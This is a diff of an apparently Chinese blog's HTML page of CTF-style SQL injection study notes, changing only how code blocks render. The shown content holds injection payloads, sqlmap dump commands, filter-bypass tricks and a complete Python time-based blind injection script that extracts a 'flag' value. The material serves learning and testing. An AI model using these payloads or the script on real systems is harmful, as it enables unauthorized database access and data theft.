@@ -51,6 +51,10 @@
   
 
   
+    
+<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">
+
+  
 
   
 </head>
@@ -108,7 +112,9 @@
 <p>去掉头尾单引号，自己输入的内容右边的内容即为闭合方式（上例为单引号）</p>
 <p><code>?id=1asdf</code>（先加闭合方式，再加–+注释，页面恢复正常）</p>
 <p>验证输入内容数据库能否执行(加单引号让SQL语句发生错误，破坏SQL语句的完整性，没有达到SQL语句语法规则，从而判断可实现sql注入)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and 1=1 #有显示</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and 1=2 #没显示</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">?id=1&#x27; and 1=1 #有显示
+
+?id=1&#x27; and 1=2 #没显示</code></pre>
 
 <p>需要注意的是，在测试删除功能时尽量不要使用<code>and 1=1</code>，否则可能会将数据全部删除</p>
 <p><strong>3.判断列数</strong></p>
@@ -158,11 +164,11 @@
 <p>distinct可以排除重复值，order by子句可以对结果中的值进行跑徐，separator是一个字符串值，缺省为一个逗号</p>
 <h5 id="substr：用来截取数据库某个字段中的一部分"><a href="#substr：用来截取数据库某个字段中的一部分" class="headerlink" title="substr：用来截取数据库某个字段中的一部分"></a>substr：用来截取数据库某个字段中的一部分</h5><p><code>substr(string，start，length)</code></p>
 <p>例如，获取 <code>column_name</code> 列的前 10 个字符</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select substr(列名, 1, 10) from 表名 </span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">select substr(列名, 1, 10) from 表名</code></pre>
 
 <p><code>substring(列名, 1, 10)</code>：从 <code>column_name</code> 的第 1 个字符开始，提取 10 个字符</p>
 <p>如报错注入中</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and extractvalue(1,concat(0x7e,(select substring(value,1,10) from flag ),0x7e)) #</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">&#x27;and extractvalue(1,concat(0x7e,(select substring(value,1,10) from flag ),0x7e)) #</code></pre>
 
 <h5 id="ascii：返回字符串str最左边的数值"><a href="#ascii：返回字符串str最左边的数值" class="headerlink" title="ascii：返回字符串str最左边的数值"></a>ascii：返回字符串str最左边的数值</h5><p>ascii(str)</p>
 </blockquote>
@@ -223,7 +229,54 @@
 <p>查值（虚拟机中）：<code>sqlmap -r 1.txt --technique T -D web -T flag -C value --dump --level 3 --risk 3</code></p>
 <blockquote>
 <p>[!TIP]</p>
-<h4 id="时间盲注脚本"><a href="#时间盲注脚本" class="headerlink" title="时间盲注脚本"></a>时间盲注脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">#配置目标 URL 和基础信息</span><br><span class="line"></span><br><span class="line">url = &quot;........&quot;</span><br><span class="line">username_template = &quot;&#x27; or if((select substr(value,&#123;index&#125;,1) from flag)=&#x27;&#123;char&#125;&#x27;,sleep(3),0)#&quot;</span><br><span class="line">#填写payload</span><br><span class="line">password = &quot;0&quot;</span><br><span class="line"></span><br><span class="line">#用于测试的字符集（可以根据实际情况扩展）</span><br><span class="line"></span><br><span class="line">charset = string.ascii_letters + string.digits + &quot;&#123;&#125;_-&quot;</span><br><span class="line"></span><br><span class="line">def time_blind_injection():</span><br><span class="line">    extracted_value = &quot;&quot;</span><br><span class="line">    index = 1  # 从第1个字符开始</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        found = False</span><br><span class="line">        for char in charset:</span><br><span class="line">            payload = username_template.format(index=index, char=char)</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            </span><br><span class="line">            # 发送 POST 请求</span><br><span class="line">            response = requests.post(url, data=&#123;&quot;username&quot;: payload, &quot;password&quot;: password&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            # 判断响应时间是否超过3秒</span><br><span class="line">            if elapsed_time &gt; 3:</span><br><span class="line">                extracted_value += char</span><br><span class="line">                print(f&quot;[+] Found character at position &#123;index&#125;: &#123;char&#125;&quot;)</span><br><span class="line">                found = True</span><br><span class="line">                break</span><br><span class="line">    </span><br><span class="line">        if not found:  # 如果在当前索引没有找到字符，说明到达字符串末尾</span><br><span class="line">            print(&quot;[+] Extraction complete!&quot;)</span><br><span class="line">            break</span><br><span class="line">    </span><br><span class="line">        index += 1</span><br><span class="line">    </span><br><span class="line">    return extracted_value</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    print(&quot;[*] Starting time-based blind SQL injection...&quot;)</span><br><span class="line">    result = time_blind_injection()</span><br><span class="line">    print(f&quot;[+] Extracted value: &#123;result&#125;&quot;)</span><br></pre></td></tr></table></figure>
+<h4 id="时间盲注脚本"><a href="#时间盲注脚本" class="headerlink" title="时间盲注脚本"></a>时间盲注脚本</h4><pre><code class="hljs plaintext">import requests
+import string
+import time
+
+#配置目标 URL 和基础信息
+
+url = &quot;........&quot;
+username_template = &quot;&#x27; or if((select substr(value,&#123;index&#125;,1) from flag)=&#x27;&#123;char&#125;&#x27;,sleep(3),0)#&quot;
+#填写payload
+password = &quot;0&quot;
+
+#用于测试的字符集（可以根据实际情况扩展）
+
+charset = string.ascii_letters + string.digits + &quot;&#123;&#125;_-&quot;
+
+def time_blind_injection():
+    extracted_value = &quot;&quot;
+    index = 1  # 从第1个字符开始
+
+    while True:
+        found = False
+        for char in charset:
+            payload = username_template.format(index=index, char=char)
+            start_time = time.time()
+            
+            # 发送 POST 请求
+            response = requests.post(url, data=&#123;&quot;username&quot;: payload, &quot;password&quot;: password&#125;)
+            elapsed_time = time.time() - start_time
+            
+            # 判断响应时间是否超过3秒
+            if elapsed_time &gt; 3:
+                extracted_value += char
+                print(f&quot;[+] Found character at position &#123;index&#125;: &#123;char&#125;&quot;)
+                found = True
+                break
+    
+        if not found:  # 如果在当前索引没有找到字符，说明到达字符串末尾
+            print(&quot;[+] Extraction complete!&quot;)
+            break
+    
+        index += 1
+    
+    return extracted_value
+
+if __name__ == &quot;__main__&quot;:
+    print(&quot;[*] Starting time-based blind SQL injection...&quot;)
+    result = time_blind_injection()
+    print(f&quot;[+] Extracted value: &#123;result&#125;&quot;)</code></pre>
 
 </blockquote>
 <h3 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h3><p>堆叠查询可以执行多条语句，多条语句间以分号隔开</p>
@@ -260,7 +313,7 @@
 <p><code>sqlmap -u (url) -D 数据库名 --tables</code> 跑出指定数据</p>
 <p><code>sqlmap -u (url) -D 数据库名 -T 表名 --columns</code> 跑出指定表的列名</p>
 <p><code>sqlmap -u (url) -D 数据库名 -T 表名 -C 指定列 --dump</code> 跑出指定列中的值</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --batch -u &quot;(网站url)&quot; --cookie=“···” </span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">sqlmap --batch -u &quot;(网站url)&quot; --cookie=“···”</code></pre>
 
 <p>-u：扫描目标url</p>
 <p>–batch：自动处理提示信息</p>
@@ -275,10 +328,14 @@
 <p>​	–columns：查询指定表下所有字段（先用-T指定名）</p>
 <p>​	-C：应用指定字段名</p>
 <p>获取数据：–dump</p>
-<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;#&#x27;, &#x27;--+&#x27;, &#x27;-- -&#x27;, &#x27;%23&#x27;, &#x27;%00&#x27;, &#x27;/**/&#x27;</span><br></pre></td></tr></table></figure>
+<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><pre><code class="hljs plaintext">&#x27;#&#x27;, &#x27;--+&#x27;, &#x27;-- -&#x27;, &#x27;%23&#x27;, &#x27;%00&#x27;, &#x27;/**/&#x27;</code></pre>
 
 <p><code>#</code>一般在post传参，<code>%23</code>一般在get传参</p>
-<h3 id="and，or-过滤"><a href="#and，or-过滤" class="headerlink" title="and，or 过滤"></a>and，or 过滤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 可以使用&quot;&amp;&amp;&quot;和&quot;||&quot;代替</span><br><span class="line">?id=1 &amp;&amp; 1=1 --+</span><br><span class="line"> </span><br><span class="line"># 盲注，异或运算相同为0，不同为1；根据返回值0，1判断</span><br><span class="line">?id=1 union select (substr(database(),1,1)=&#x27;s&#x27;) ^ 0 --</span><br></pre></td></tr></table></figure>
+<h3 id="and，or-过滤"><a href="#and，or-过滤" class="headerlink" title="and，or 过滤"></a>and，or 过滤</h3><pre><code class="hljs plaintext"># 可以使用&quot;&amp;&amp;&quot;和&quot;||&quot;代替
+?id=1 &amp;&amp; 1=1 --+
+ 
+# 盲注，异或运算相同为0，不同为1；根据返回值0，1判断
+?id=1 union select (substr(database(),1,1)=&#x27;s&#x27;) ^ 0 --</code></pre>
 
 <h3 id="关键词绕过"><a href="#关键词绕过" class="headerlink" title="关键词绕过"></a>关键词绕过</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p><code>id=-1&#39; UnIoN SeLeCT xxx</code></p>
 <h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p><code>id=-1&#39;UNIunionONSeLselectECT1,2,3–-</code></p>
@@ -289,29 +346,38 @@
 <h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><h4 id="内联注释代替空格"><a href="#内联注释代替空格" class="headerlink" title="内联注释代替空格"></a>内联注释代替空格</h4><p><code>id=1/**/and/**/1=1</code></p>
 <h4 id="括号嵌套"><a href="#括号嵌套" class="headerlink" title="括号嵌套"></a>括号嵌套</h4><p><code>select(group_concat(table_name))from(information_schema.taboles)where(tabel_schema=database());</code></p>
 <h4 id="制表符、换行、不可见空格"><a href="#制表符、换行、不可见空格" class="headerlink" title="制表符、换行、不可见空格"></a>制表符、换行、不可见空格</h4><p>%09(制表符), %0a(换行), %0b(垂直制表符), %0d(回车), %a0(不间断空格)%0c(换页符),%20(空格)</p>
-<h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union(select`table_name`,`table_type`from`information_schema`.`tables`);</span><br></pre></td></tr></table></figure>
+<h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><pre><code class="hljs plaintext">union(select`table_name`,`table_type`from`information_schema`.`tables`);</code></pre>
 
 <h3 id="被过滤"><a href="#被过滤" class="headerlink" title="&#x3D;被过滤"></a>&#x3D;被过滤</h3><p>可以用like(其子句中用%来表示任意字符)或rlike，也可以用regexp(不区分大小写，若需要大小写敏感，加binary)来绕过</p>
 <p>比如&#x3D;’admin’ 就可以like ‘admin’</p>
 <h3 id="逗号过滤"><a href="#逗号过滤" class="headerlink" title="逗号过滤"></a>逗号过滤</h3><p>逗号被过滤时可以使用from…for…</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr(select database() from 1 for 1);</span><br><span class="line">select substr(select database() from 2 for 1);</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">select substr(select database() from 1 for 1);
+select substr(select database() from 2 for 1);</code></pre>
 
 <p>limit中的逗号可以替换成<strong>offset</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users limit 1 offset 2;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">select * from users limit 1 offset 2;</code></pre>
 
 <p>需要注意，limit 1,2 指的是从第一行往后取2行（包括第一行和第二行)；而limit 1 offset 2是从第一行开始只取第二行</p>
-<h3 id="False注入"><a href="#False注入" class="headerlink" title="False注入"></a>False注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username = 0;		# 查询表中所有数据</span><br></pre></td></tr></table></figure>
+<h3 id="False注入"><a href="#False注入" class="headerlink" title="False注入"></a>False注入</h3><pre><code class="hljs plaintext">select * from users where username = 0;        # 查询表中所有数据</code></pre>
 
 <p>其实是利用了mysql的隐式类型转换，当字符串与数字比较时，会<strong>将字符串转换为浮点数</strong>，转换失败并<strong>返回0</strong>，0 &#x3D; 0返回True，就会返回表中所有数据</p>
 <p>绕过引号构造0的方法</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username = &#x27;&#x27;+&#x27;&#x27;;</span><br><span class="line">select * from users where username = &#x27;&#x27;-&#x27;&#x27;;</span><br><span class="line">select * from users where username = &#x27;&#x27;*&#x27;&#x27;;</span><br><span class="line">select * from users where username = &#x27;&#x27;%1#&#x27;;</span><br><span class="line">select * from users where username = &#x27;&#x27;/6#&#x27;;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">select * from users where username = &#x27;&#x27;+&#x27;&#x27;;
+select * from users where username = &#x27;&#x27;-&#x27;&#x27;;
+select * from users where username = &#x27;&#x27;*&#x27;&#x27;;
+select * from users where username = &#x27;&#x27;%1#&#x27;;
+select * from users where username = &#x27;&#x27;/6#&#x27;;</code></pre>
 
-<h3 id="等价函数"><a href="#等价函数" class="headerlink" title="等价函数"></a>等价函数</h3><h4 id="if-与-case…when-then…else…end"><a href="#if-与-case…when-then…else…end" class="headerlink" title="if()与 case…when..then…else…end"></a>if()与 case…when..then…else…end</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; or if((ascii(substr((select database()),1,1))&gt;97),1,0)#</span><br><span class="line">=</span><br><span class="line">0&#x27; or case when ascii(substr((select database()),1,1))&gt;97 then 1 else 0 end#</span><br></pre></td></tr></table></figure>
+<h3 id="等价函数"><a href="#等价函数" class="headerlink" title="等价函数"></a>等价函数</h3><h4 id="if-与-case…when-then…else…end"><a href="#if-与-case…when-then…else…end" class="headerlink" title="if()与 case…when..then…else…end"></a>if()与 case…when..then…else…end</h4><pre><code class="hljs plaintext">0&#x27; or if((ascii(substr((select database()),1,1))&gt;97),1,0)#
+=
+0&#x27; or case when ascii(substr((select database()),1,1))&gt;97 then 1 else 0 end#</code></pre>
 
 <h4 id="sleep-与benchmark"><a href="#sleep-与benchmark" class="headerlink" title="sleep()与benchmark()"></a>sleep()与benchmark()</h4><p>benchmark()函数用来测试执行速度，第一个参数代表执行的次数，第二个参数代表要执行的表达式或函数，根据执行的时间来判断</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 AND BENCHMARK(5000000, MD5(&#x27;test&#x27;))</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">?id=1 AND BENCHMARK(5000000, MD5(&#x27;test&#x27;))</code></pre>
 
-<h4 id="concat-ws-与group-concat"><a href="#concat-ws-与group-concat" class="headerlink" title="concat_ws()与group_concat()"></a>concat_ws()与group_concat()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(database());</span><br><span class="line">=</span><br><span class="line">select concat_ws(1,database());</span><br></pre></td></tr></table></figure>
+<h4 id="concat-ws-与group-concat"><a href="#concat-ws-与group-concat" class="headerlink" title="concat_ws()与group_concat()"></a>concat_ws()与group_concat()</h4><pre><code class="hljs plaintext">select group_concat(database());
+=
+select concat_ws(1,database());</code></pre>
 
 <h4 id="substr-与substring-ipad-rpad-left-mid"><a href="#substr-与substring-ipad-rpad-left-mid" class="headerlink" title="substr()与substring()&#x2F;ipad()&#x2F;rpad()&#x2F;left()&#x2F;mid()"></a>substr()与substring()&#x2F;ipad()&#x2F;rpad()&#x2F;left()&#x2F;mid()</h4><h2 id="outfile-sql注入之文件写入webshell（太难了，暂定）"><a href="#outfile-sql注入之文件写入webshell（太难了，暂定）" class="headerlink" title="outfile_sql注入之文件写入webshell（太难了，暂定）"></a>outfile_sql注入之文件写入webshell（太难了，暂定）</h2>
 <div class="article-footer fs14">
